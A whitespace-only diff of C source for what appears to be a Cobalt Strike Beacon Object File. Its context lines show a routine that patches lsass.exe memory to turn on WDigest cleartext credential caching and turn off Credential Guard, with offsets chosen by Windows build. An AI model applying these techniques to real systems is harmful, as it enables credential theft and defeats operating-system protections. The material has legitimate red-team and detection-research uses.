@@ -29,7 +29,7 @@ HRESULT BeaconPrintToStreamW(_In_z_ LPCWSTR lpwFormat, ...) {
 		hr = E_FAIL;
 		goto CleanUp;
 	}
-	
+
 	if (FAILED(hr = lpStream->lpVtbl->Write(lpStream, chBuffer, (ULONG)MSVCRT$wcslen(chBuffer) * sizeof(WCHAR), &dwWritten))) {
 		goto CleanUp;
 	}
@@ -37,7 +37,7 @@ HRESULT BeaconPrintToStreamW(_In_z_ LPCWSTR lpwFormat, ...) {
 CleanUp:
 
 	va_end(argList);
-	
+
 	return hr;
 }
 
@@ -60,7 +60,7 @@ VOID BeaconOutputStreamW() {
 			goto CleanUp;
 		}
 
-		if (FAILED(lpStream->lpVtbl->Read(lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {		
+		if (FAILED(lpStream->lpVtbl->Read(lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {
 			goto CleanUp;
 		}
 
@@ -157,7 +157,7 @@ BOOL ToggleWDigest(HANDLE hLsass, LPSTR scWdigestMem, DWORD64 logonCredential_of
 		return FALSE;
 	}
 	else {
-		BeaconPrintToStreamW(L"[+] Current value of g_fParameter_UseLogonCredential is: %d\n", ulCurLogonValue);	
+		BeaconPrintToStreamW(L"[+] Current value of g_fParameter_UseLogonCredential is: %d\n", ulCurLogonValue);
 		BeaconPrintToStreamW(L"[+] Toggling g_fParameter_UseLogonCredential to 1 in lsass.exe\n");
 	}
 
@@ -186,7 +186,7 @@ BOOL ToggleWDigest(HANDLE hLsass, LPSTR scWdigestMem, DWORD64 logonCredential_of
 			return FALSE;
 		}
 		else {
-			BeaconPrintToStreamW(L"[+] Current value of g_IsCredGuardEnabled is: %d\n", ulCurCredGuardValue);	
+			BeaconPrintToStreamW(L"[+] Current value of g_IsCredGuardEnabled is: %d\n", ulCurCredGuardValue);
 			BeaconPrintToStreamW(L"[+] Toggling g_IsCredGuardEnabled to 0 in lsass.exe\n");
 		}
 
@@ -278,7 +278,7 @@ HANDLE OpenRegKeyHandle(INT DesiredAccess, PUNICODE_STRING RegistryKeyName) {
 DWORD ReadUBRFromRegistry() {
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	HANDLE regKeyHandle = NULL;
-	UNICODE_STRING RegistryKeyName;	
+	UNICODE_STRING RegistryKeyName;
 	UNICODE_STRING KeyValueName;
 	PKEY_VALUE_FULL_INFORMATION KeyValueInformation = NULL;
 	ULONG KeyResultLength = 0;
@@ -456,7 +456,7 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 	}
 
 	MSVCRT$swprintf_s(chOSMajorMinor, sizeof(chOSMajorMinor), L"%u.%u", pPEB->OSMajorVersion, pPEB->OSMinorVersion);
-	
+
 	// Read UBR value from registry (we don't want to screw up lsass)
 	dwUBR = ReadUBRFromRegistry();
 	if (dwUBR != 0) {
